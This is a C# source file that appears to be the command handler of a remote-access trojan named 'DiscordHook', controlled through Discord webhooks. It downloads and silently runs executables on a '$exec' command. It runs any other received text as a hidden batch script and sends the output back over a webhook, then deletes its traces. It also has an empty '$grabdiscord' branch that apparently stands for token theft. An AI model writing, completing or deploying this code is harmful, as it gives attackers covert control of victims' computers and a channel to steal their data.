using System;
using System.ComponentModel;
using System.Diagnostics;
using System.IO;
using System.Text;
using System.Threading.Tasks;
using static DiscordHook.Utility;

namespace DiscordHook
{
    public static class CommandHandler
    {
        public static async Task HandleCmd(string command, string replyhook, string commandhook)
        {
            if (command == null || string.IsNullOrEmpty(command) || string.IsNullOrWhiteSpace(command)) await Task.CompletedTask;
            // ReSharper disable once PossibleNullReferenceException
            if (command[0] == '$')
            {
                if (command.Contains("$exec"))
                {

                    try
                    {
                        var newprocess = new Process()
                        {
                            StartInfo =
                            {
                                UseShellExecute = true,
                                FileName = await DownloadExeAsync(command.Substring(6), replyhook),
                                CreateNoWindow = true
                            }
                        };
                        newprocess.Start();
                    }
                    catch
                    {
                        await SendStringHook("Error, could not download or execute the file", replyhook);
                    }
                }
                else if (command.Contains("$grabdiscord"))
                {
                    
                }
            }
            else            //shell commands
            {
                using var batfile = File.Create(@$"{Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData)}\DiscordHook\shell.bat");
                await batfile.WriteAsync(Encoding.ASCII.GetBytes(command), 0, Encoding.ASCII.GetBytes(command).Length);
                batfile.Close();

                var shellproc = new Process
                {
                    StartInfo =
                    {
                        UseShellExecute = false,
                        RedirectStandardOutput = true,
                        FileName = @$"{Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData)}\DiscordHook\shell.bat",
                        CreateNoWindow = true
                    }
                };
                shellproc.Start();
                var outputstring = await shellproc.StandardOutput.ReadToEndAsync();
                shellproc.WaitForExit();
                if (outputstring.Length < 1990)
                {
                    await SendStringHook(outputstring, replyhook);
                }
                else
                {
                    using var outputfile = File.Create(@$"{Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData)}\DiscordHook\output.txt");
                    await outputfile.WriteAsync(Encoding.ASCII.GetBytes(outputstring), 0,
                        Encoding.ASCII.GetBytes(outputstring).Length);
                    outputfile.Close();
                    await SendFileHook(replyhook, new FileInfo(@$"{Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData)}\DiscordHook\output.txt"));
                    File.Delete(@$"{Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData)}\DiscordHook\output.txt");
                }
                File.Delete(@$"{Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData)}\DiscordHook\shell.bat");
            }
            await SendStringHook("null", commandhook);
        }
    }
}